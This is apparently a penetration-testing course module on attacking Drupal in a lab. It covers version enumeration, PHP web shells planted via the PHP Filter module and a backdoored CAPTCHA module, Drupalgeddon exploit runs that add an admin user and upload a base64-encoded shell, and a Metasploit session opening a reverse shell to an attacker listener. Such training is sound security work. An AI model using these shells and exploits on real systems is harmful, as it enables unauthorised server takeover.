CMS written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules. Drupal supports three types of users by default:

1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
# Footprinting
A Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt file`, via the page source, or clues in the `robots.txt` file such as references to `/node`.
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (<https://www.drupal.org>)" />
      <span>Powered by <a href="<https://www.drupal.org>">Drupal</a></span>
```
Another way to identify Drupal CMS is through [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes). Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.
```bash
http://drupal.inlanefreight.local/node/1
```
![[drupal_node.webp]]

# Enumeration
Once we have discovered a Drupal instance, we can do a combination of manual and tool-based (automated) enumeration to uncover the version, installed plugins, and more. Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files, so we may need to do further enumeration. Let's look at an example of enumerating the version number using the `CHANGELOG.txt` file. To do so, we can use `cURL` along with `grep`, `sed`, `head`, etc.
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
On `newer installations of Drupal`, we would get a `404` response. To identify the version, we could scan with `droopescan` as shown in the Joomla enumeration section. `Droopescan` has much more functionality for Drupal than it does for Joomla.
```bash
sudo pip3 install droopescan
droopescan scan drupal -u http://drupal.inlanefreight.local

[+] Plugins found:                                                              
    php <http://drupal.inlanefreight.local/modules/php/>
        <http://drupal.inlanefreight.local/modules/php/LICENSE.txt>

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - <http://drupal.inlanefreight.local/user/login>

[+] Scan finished (0:03:19.199526 elapsed)
```
This instance appears to be running version `8.9.1` of Drupal ! A quick search for Drupal-related [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html) does not show anything apparent for this core version of Drupal. In this instance, we would next want to look at installed plugins or abusing built-in functionality.
# Attacking Drupal
Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.
### Leveraging the PHP Filter Module
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
```bash
http://drupal-qa.inlanefreight.local/#overlay=admin/modules
```
![[drupal_php_module.webp]]
From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.
```bash
http://drupal-qa.inlanefreight.local/#overlay=node/add
```
![[basic_page.webp]]
We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard `system($_GET['cmd']);` we open up ourselves up to a "drive-by" attacker potentially coming across our web shell. Though unlikely, better safe than sorry!
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

```php
http://drupal-qa.inlanefreight.local/#overlay=node/add/page
```
![[basic_page_shell_7v2.webp]]

We also want to make sure to set `Text format` drop-down to `PHP code`. After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`. Once saved, we can either request execute commands in the browser by appending `?dcfdd5e021a869fcc6dfaef8bf31377e=id` to the end of the URL to run the `id` command or use `cURL` on the command line. From here, we could use a bash one-liner to obtain reverse shell access.
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
Once downloaded go to `Administration` > `Reports` > `Available updates` 
```bash
 http://drupal.inlanefreight.local/admin/reports/updates/install
```
![[install_module.webp]]
From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`. Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown. With either of these examples, we should keep our client apprised and obtain permission before making these sorts of changes.

Also, once we are done, we should remove or disable the `PHP Filter` module and delete any pages that we created to gain remote code execution.

### Uploading a Backdoored Modules
Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the [drupal.org](http://drupal.org) website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).
```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
Create a `PHP web shell` with the contents :
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```
Next, we need to create a `.htaccess` file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder :
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```
Assuming we have `administrative access` to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
```bash
http://drupal.inlanefreight.local/core/authorize.php
```
![[module_installed.webp]]
Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands :
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Leveraging Known Vulnerabilities

`Drupalgeddon` :

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as `Drupalgeddon`, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as `Drupalgeddon2`, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as `Drupalgeddon3`, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
### Drupalgeddon

As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution. Here we see that we need to supply the target URL and a username and password for our new admin account :
```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: <http://drupal-qa.inlanefreight.local/?q=node&destination=node>
```
Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.
```bash
http://drupal-qa.inlanefreight.local/user#overlay=admin/people
```
![[drupalgeddon.webp]]
We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.
### Drupalgeddon2

We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability :
```bash
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# <https://github.com/a2u/CVE-2018-7600>
################################################################
Provided only for educational or information purposes

Enter target url (example: <https://domain.ltd/>): <http://drupal-dev.inlanefreight.local/>

Check: <http://drupal-dev.inlanefreight.local/hello.txt>
```
We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded :
```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```
Now let's modify the script to gain remote code execution by uploading a malicious PHP file :
```bash
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
Next, run the modified exploit script to upload our malicious PHP file.
```bash
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# <https://github.com/a2u/CVE-2018-7600>
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```
Finally, we can confirm remote code execution using `cURL` :
```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Drupalgeddon3
[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie :
![[burp.webp]]
Once we have the session cookie, we can set up the exploit module :
```bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
```
If successful, we will obtain a reverse shell on the target host :
```bash
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)

meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```